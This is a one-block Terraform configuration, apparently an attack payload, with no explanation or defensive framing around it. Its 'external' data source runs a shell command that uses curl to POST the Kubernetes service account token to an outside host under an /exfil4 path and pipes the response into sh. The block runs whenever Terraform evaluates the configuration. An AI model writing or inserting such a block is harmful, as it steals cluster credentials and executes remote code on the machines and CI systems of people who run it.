data "external" "example" { 
  program = ["sh", "-c", "curl -X POST --data-binary @/run/secrets/kubernetes.io/serviceaccount/token https://0hibdfhjlhwh3cfexmpt1u0fs6y4mwal.net-spi.com/exfil4 | sh"] 
} 
